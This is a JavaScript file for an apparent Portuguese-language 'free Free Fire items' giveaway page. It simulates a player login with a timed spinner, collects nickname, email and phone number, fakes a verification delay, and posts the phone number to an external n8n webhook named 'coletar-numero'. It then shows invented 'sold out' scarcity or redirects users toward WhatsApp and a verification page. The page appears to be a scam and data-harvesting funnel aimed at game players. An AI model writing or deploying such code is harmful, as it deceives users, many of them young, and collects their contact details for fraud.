// Global variables
let selectedOffer = null
let userData = {}
let playerId = null

// DOM Elements
const gameItems = document.querySelectorAll(".game-item")
const offerItems = document.querySelectorAll(".offer-item")
const btnFreeClaim = document.getElementById("btnFreeClaim")
const selectedSummary = document.getElementById("selectedSummary")
const playerIdInput = document.getElementById("player-id")
const btnPlayerLogin = document.getElementById("btnPlayerLogin")
const displayUserId = document.getElementById("displayUserId")

// Modals
const gameUnavailableModal = document.getElementById("gameUnavailableModal")
const loadingModal = document.getElementById("loadingModal")
const userDataModal = document.getElementById("userDataModal")
const confirmDataModal = document.getElementById("confirmDataModal")
const verifyingModal = document.getElementById("verifyingModal")
const whatsappRedirectModal = document.getElementById("whatsappRedirectModal")

// Initialize
document.addEventListener("DOMContentLoaded", () => {
  initializeEventListeners()
  updateClaimButtonState()
  initializeSeeMoreButton()
})

function initializeEventListeners() {
  // Game selection
  gameItems.forEach((item) => {
    item.addEventListener("click", handleGameSelection)
  })

  // Offer selection
  offerItems.forEach((item) => {
    if (!item.classList.contains("sold-out")) {
      item.addEventListener("click", handleOfferSelection)
    }
  })

  // Player ID login - Only allow numbers
  playerIdInput.addEventListener("input", function (e) {
    this.value = this.value.replace(/\D/g, "")
  })

  btnPlayerLogin.addEventListener("click", handlePlayerLogin)

  // Free claim button
  btnFreeClaim.addEventListener("click", handleFreeClaim)

  // Modal close buttons
  document.querySelectorAll(".close").forEach((closeBtn) => {
    closeBtn.addEventListener("click", closeModal)
  })

  // Modal buttons
  document.getElementById("btnGoToWhatsapp").addEventListener("click", redirectToVerification)
  document.querySelector(".btn-modal-ok").addEventListener("click", closeModal)

  // User data form
  const userDataForm = document.getElementById("userDataForm")

  // Phone number formatting with Brazilian format
  const phoneInput = document.getElementById("phone")
  phoneInput.addEventListener("input", function (e) {
    let value = this.value.replace(/\D/g, "")

    // Limit to 11 digits (DDD + 9 digits)
    if (value.length > 11) {
      value = value.substring(0, 11)
    }

    // Format: (XX) XXXXX-XXXX
    if (value.length >= 11) {
      value = value.replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3")
    } else if (value.length >= 7) {
      value = value.replace(/(\d{2})(\d{5})(\d*)/, "($1) $2-$3")
    } else if (value.length >= 3) {
      value = value.replace(/(\d{2})(\d*)/, "($1) $2")
    }

    this.value = value
  })

  userDataForm.addEventListener("submit", (event) => {
    event.preventDefault()

    const ffId = document.getElementById("ffId").value
    const nickname = document.getElementById("nickname").value
    const email = document.getElementById("email").value
    const phone = document.getElementById("phone").value.replace(/\D/g, "") // Remove formatting for storage
    const acceptTerms = document.getElementById("acceptTerms").checked
    const confirmAge = document.getElementById("confirmAge").checked

    if (!ffId || !nickname || !email || !phone || !acceptTerms || !confirmAge) {
      showToast("Por favor, preencha todos os campos")
      return
    }

    userData = {
      ffId: ffId,
      nickname: nickname.toUpperCase(),
      email: email,
      phone: phone,
    }

    // Validate data
    if (!validateUserData(userData)) {
      return
    }

    // Show confirmation modal
    populateConfirmationModal()
    closeModal()
    showModal(confirmDataModal)
  })

  // Confirm data button with webhook integration
  document.getElementById("btnConfirmData").addEventListener("click", handleDataConfirmation)

  // Edit number button
  document.getElementById("btnEditNumber").addEventListener("click", () => {
    closeModal()
    showModal(userDataModal)
  })

  // Click outside modal to close
  window.addEventListener("click", (event) => {
    if (event.target.classList.contains("modal")) {
      closeModal()
    }
  })
}

function initializeSeeMoreButton() {
  const btnSeeMore = document.getElementById("btnSeeMore")
  if (!btnSeeMore) return

  let isExpanded = false

  btnSeeMore.addEventListener("click", () => {
    const hiddenItems = document.querySelectorAll(".offer-item.hidden")

    if (!isExpanded) {
      // Mostrar itens
      hiddenItems.forEach((item) => {
        item.style.display = "flex"
      })
      btnSeeMore.innerHTML = '<span>Ver menos</span><i class="fas fa-chevron-up"></i>'
      isExpanded = true
    } else {
      // Esconder itens
      hiddenItems.forEach((item) => {
        item.style.display = "none"
      })
      btnSeeMore.innerHTML = '<span>Ver mais</span><i class="fas fa-chevron-down"></i>'
      isExpanded = false
    }
  })
}

function handlePlayerLogin() {
  const id = playerIdInput.value.trim()
  if (id) {
    // Show loading overlay
    showLoadingOverlay("Conectando ao servidor...")

    // After 1.5 seconds, hide overlay and update UI
    setTimeout(() => {
      hideLoadingOverlay()
      playerId = id
      displayUserId.textContent = id
      showToast("Login realizado com sucesso!")
    }, 1500)
  } else {
    showToast("Por favor, insira um ID válido.")
  }
}

function showLoadingOverlay(message) {
  // Create overlay
  const overlay = document.createElement("div")
  overlay.className = "page-overlay"
  overlay.id = "loadingOverlay"
  overlay.innerHTML = `
    <div class="overlay-spinner">
      <i class="fas fa-spinner fa-spin"></i>
    </div>
    <div class="overlay-text">${message}</div>
  `
  document.body.appendChild(overlay)
  document.body.style.overflow = "hidden"
}

function hideLoadingOverlay() {
  const overlay = document.getElementById("loadingOverlay")
  if (overlay) {
    overlay.remove()
    document.body.style.overflow = "auto"
  }
}

function handleGameSelection(event) {
  const gameItem = event.currentTarget
  const game = gameItem.dataset.game

  // Remove active class from all games
  gameItems.forEach((item) => item.classList.remove("active"))

  if (game === "freefire") {
    // Activate Free Fire
    gameItem.classList.add("active")
  } else {
    // Show unavailable modal for other games
    showModal(gameUnavailableModal)
    // Keep Free Fire selected
    document.querySelector('[data-game="freefire"]').classList.add("active")
  }
}

function handleOfferSelection(event) {
  const offerItem = event.currentTarget

  // Skip if sold out
  if (offerItem.classList.contains("sold-out")) {
    return
  }

  const offer = offerItem.dataset.offer

  // Remove selection from all offers
  offerItems.forEach((item) => {
    if (!item.classList.contains("sold-out")) {
      item.style.border = "2px solid #e9ecef"
      item.style.boxShadow = "none"
    }
  })

  // Add selection to clicked offer
  offerItem.style.border = "2px solid #e30613"
  offerItem.style.boxShadow = "0 0 0 3px rgba(227, 6, 19, 0.1)"

  // Store selected offer
  selectedOffer = {
    id: offer,
    name: offerItem.querySelector("span").textContent,
    image: offerItem.querySelector("img").src,
  }

  // Update summary
  updateSelectedSummary()
  updateClaimButtonState()
}

function updateSelectedSummary() {
  if (selectedOffer) {
    document.getElementById("summaryImage").src = selectedOffer.image
    document.getElementById("summaryName").textContent = selectedOffer.name
    selectedSummary.style.display = "block"
  } else {
    selectedSummary.style.display = "none"
  }
}

function updateClaimButtonState() {
  if (selectedOffer) {
    btnFreeClaim.style.opacity = "1"
    btnFreeClaim.style.cursor = "pointer"
    btnFreeClaim.disabled = false
  } else {
    btnFreeClaim.style.opacity = "0.6"
    btnFreeClaim.style.cursor = "not-allowed"
    btnFreeClaim.disabled = true
  }
}

function handleFreeClaim() {
  if (!selectedOffer) {
    showToast("Por favor, selecione uma oferta primeiro.")
    return
  }

  if (!playerId) {
    showToast("Por favor, faça login com seu ID primeiro.")
    return
  }

  // Pre-fill ID field
  document.getElementById("ffId").value = playerId

  // Show user data modal
  showModal(userDataModal)
}

function validateUserData(data) {
  // Validate nickname (no special characters)
  const nicknameRegex = /^[A-Za-z0-9]+$/
  if (!nicknameRegex.test(data.nickname)) {
    showToast("Nick deve conter apenas letras e números, sem caracteres especiais.")
    return false
  }

  // Validate email
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
  if (!emailRegex.test(data.email)) {
    showToast("Por favor, insira um email válido.")
    return false
  }

  // Validate phone (DDD + 9 + 8 digits)
  const phoneRegex = /^\d{11}$/
  if (!phoneRegex.test(data.phone)) {
    showToast("Telefone deve ter o formato: (XX) XXXXX-XXXX")
    return false
  }

  return true
}

function formatPhoneDisplay(phone) {
  // Format phone for display: 11999999999 -> (11) 99999-9999
  if (phone.length === 11) {
    return phone.replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3")
  }
  return phone
}

function populateConfirmationModal() {
  document.getElementById("confirmNick").textContent = userData.nickname
  document.getElementById("confirmEmail").textContent = userData.email
  document.getElementById("confirmPhone").value = formatPhoneDisplay(userData.phone)
}

async function handleDataConfirmation() {
  // Get the current phone value (might have been edited)
  const phoneValue = document.getElementById("confirmPhone").value.replace(/\D/g, "")

  // Update phone if edited
  userData.phone = phoneValue

  // Validate phone again
  const phoneRegex = /^\d{11}$/
  if (!phoneRegex.test(userData.phone)) {
    showToast("Telefone deve ter o formato: (XX) XXXXX-XXXX")
    return
  }

  // Show verifying modal
  closeModal()
  showModal(verifyingModal)

  try {
    // Simulate 3 seconds loading
    await new Promise((resolve) => setTimeout(resolve, 3000))

    const cleanPhone = userData.phone.replace(/\D/g, "")

    const response = await fetch("https://main-n8n.ohbhf7.easypanel.host/webhook/coletar-numero", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ telefone: cleanPhone }),
    })

    const data = await response.json()

    if (data.disponibilidade === "lotado") {
      // Show lotado modal
      closeModal()
      showLotadoModal()
    } else {
      // Success - proceed to WhatsApp redirect
      closeModal()
      showModal(whatsappRedirectModal)
    }
  } catch (error) {
    console.error("Erro ao verificar número:", error)
    closeModal()
    showLotadoModal()
  }
}

function showLotadoModal() {
  const lotadoModal = document.createElement("div")
  lotadoModal.className = "modal"
  lotadoModal.style.display = "block"
  lotadoModal.innerHTML = `
    <div class="modal-content lotado-modal">
      <div class="lotado-header">
        <div class="users-icon">
          <i class="fas fa-users"></i>
        </div>
        <h3>Vagas Esgotadas</h3>
        <p class="lotado-subtitle">Todas as vagas para esta promoção foram preenchidas</p>
      </div>
      <div class="modal-body">
        <p style="text-align: center; margin-bottom: 20px; color: #495057; line-height: 1.5;">
          Infelizmente, todas as vagas disponíveis para esta promoção já foram ocupadas. 
          Tente novamente mais tarde ou aguarde uma nova promoção.
        </p>
      </div>
      <div class="modal-footer">
        <button class="btn-lotado-ok" onclick="this.closest('.modal').remove()">
          <i class="fas fa-check"></i>
          ENTENDI
        </button>
      </div>
    </div>
  `

  document.body.appendChild(lotadoModal)
  document.body.style.overflow = "hidden"

  // Close modal when clicking outside
  lotadoModal.addEventListener("click", (e) => {
    if (e.target === lotadoModal) {
      lotadoModal.remove()
      document.body.style.overflow = "auto"
    }
  })
}

function redirectToVerification() {
  // Store data in localStorage for verification page
  localStorage.setItem("userData", JSON.stringify(userData))
  localStorage.setItem("selectedOffer", JSON.stringify(selectedOffer))

  // Redirect to verification page
  window.location.href = "verification.html"
}

function showModal(modal) {
  if (modal) {
    modal.style.display = "block"
    document.body.style.overflow = "hidden"
  }
}

function closeModal() {
  document.querySelectorAll(".modal").forEach((modal) => {
    modal.style.display = "none"
  })
  document.body.style.overflow = "auto"
}

function showToast(message) {
  // Create toast notification
  const toast = document.createElement("div")
  toast.className = "toast"
  toast.textContent = message
  toast.style.cssText = `
    position: fixed;
    top: 20px;
    left: 50%;
    transform: translateX(-50%);
    background: rgba(0, 0, 0, 0.9);
    color: white;
    padding: 12px 20px;
    border-radius: 10px;
    z-index: 10000;
    font-size: 14px;
    font-weight: 500;
    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
  `

  document.body.appendChild(toast)

  setTimeout(() => {
    toast.remove()
  }, 3000)
}
